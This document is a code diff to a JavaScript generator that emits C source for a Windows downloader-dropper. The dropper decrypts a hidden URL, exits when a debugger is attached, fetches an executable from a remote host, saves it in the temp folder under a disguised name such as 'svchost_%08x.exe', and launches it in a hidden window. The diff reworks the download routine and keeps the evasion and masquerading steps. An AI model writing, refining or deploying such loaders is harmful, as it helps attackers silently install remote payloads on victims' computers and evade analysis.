@@ -48,7 +48,6 @@ function cSource({ ip }) {
   return `
 #include <windows.h>
 #include <winhttp.h>
-#include <shlobj.h>
 #include <stdio.h>
 
 #pragma comment(lib, "winhttp.lib")
@@ -62,7 +61,7 @@ void decrypt_url(wchar_t* out, int max_len) {
     out[sizeof(enc)] = 0;
 }
 
-void download_file(const wchar_t* url, const wchar_t* dest) {
+BYTE* download_to_memory(const wchar_t* url, DWORD* out_size) {
     URL_COMPONENTS uc = {0};
     uc.dwStructSize = sizeof(uc);
     wchar_t host[256] = {0};
@@ -72,72 +71,75 @@ void download_file(const wchar_t* url, const wchar_t* dest) {
     uc.lpszUrlPath = path;
     uc.dwUrlPathLength = 1024;
 
-    if (!WinHttpCrackUrl(url, 0, 0, &uc)) return;
+    if (!WinHttpCrackUrl(url, 0, 0, &uc)) return NULL;
 
     HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
-    if (!hSession) return;
+    if (!hSession) return NULL;
 
     HINTERNET hConnect = WinHttpConnect(hSession, host, uc.nPort, 0);
-    if (!hConnect) { WinHttpCloseHandle(hSession); return; }
+    if (!hConnect) { WinHttpCloseHandle(hSession); return NULL; }
 
     HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
-    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return; }
+    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return NULL; }
+
+    BYTE* buffer = NULL;
+    *out_size = 0;
 
     if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
         WinHttpReceiveResponse(hRequest, NULL)) {
-        
-        HANDLE hFile = CreateFileW(dest, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-        if (hFile != INVALID_HANDLE_VALUE) {
-            DWORD dwSize = 0;
-            DWORD dwDownloaded = 0;
-            do {
-                dwSize = 0;
-                if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) break;
-                if (dwSize == 0) break;
-                
-                BYTE* pBuffer = (BYTE*)malloc(dwSize);
-                if (!pBuffer) break;
-                
+        DWORD dwSize = 0, dwDownloaded = 0;
+        do {
+            dwSize = 0;
+            if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) break;
+            if (dwSize == 0) break;
+
+            BYTE* pBuffer = (BYTE*)malloc(dwSize);
+            if (pBuffer) {
                 if (WinHttpReadData(hRequest, pBuffer, dwSize, &dwDownloaded)) {
-                    DWORD written;
-                    WriteFile(hFile, pBuffer, dwDownloaded, &written, NULL);
+                    buffer = (BYTE*)realloc(buffer, *out_size + dwDownloaded);
+                    memcpy(buffer + *out_size, pBuffer, dwDownloaded);
+                    *out_size += dwDownloaded;
                 }
                 free(pBuffer);
-            } while (dwSize > 0);
-            CloseHandle(hFile);
-        }
+            }
+        } while (dwSize > 0);
     }
 
     WinHttpCloseHandle(hRequest);
     WinHttpCloseHandle(hConnect);
     WinHttpCloseHandle(hSession);
+    return buffer;
 }
 
 int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
-    (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;
-
     if (IsDebuggerPresent()) return 1;
-
-    wchar_t tempPath[MAX_PATH];
-    GetTempPathW(MAX_PATH, tempPath);
-
-    wchar_t dest[MAX_PATH];
-    _snwprintf(dest, MAX_PATH, L"%ls\\\\msiexec_install.exe", tempPath);
 
     wchar_t url[1024];
     decrypt_url(url, 1024);
-    
-    download_file(url, dest);
 
-    STARTUPINFOW si = {0};
-    PROCESS_INFORMATION pi = {0};
-    si.cb = sizeof(si);
-    si.dwFlags = STARTF_USESHOWWINDOW;
-    si.wShowWindow = SW_HIDE;
+    DWORD size = 0;
+    BYTE* exeData = download_to_memory(url, &size);
+    if (!exeData || size < 1024) return 1;
+
+    // Write to a temporary file (required for Rust EXE to run properly due to Windows PE loader)
+    wchar_t tempPath[MAX_PATH];
+    GetTempPathW(MAX_PATH, tempPath);
+    wchar_t dest[MAX_PATH];
+    _snwprintf(dest, MAX_PATH, L"%ls\\\\svchost_%08x.exe", tempPath, GetTickCount());
     
-    if (CreateProcessW(dest, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, tempPath, &si, &pi)) {
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
+    HANDLE hFile = CreateFileW(dest, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile != INVALID_HANDLE_VALUE) {
+        DWORD written;
+        WriteFile(hFile, exeData, size, &written, NULL);
+        CloseHandle(hFile);
+        free(exeData);
+
+        STARTUPINFOW si = {0}; PROCESS_INFORMATION pi = {0};
+        si.cb = sizeof(si); si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
+        
+        CreateProcessW(dest, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, tempPath, &si, &pi);
+        if (pi.hProcess) CloseHandle(pi.hProcess);
+        if (pi.hThread) CloseHandle(pi.hThread);
     }
 
     return 0;
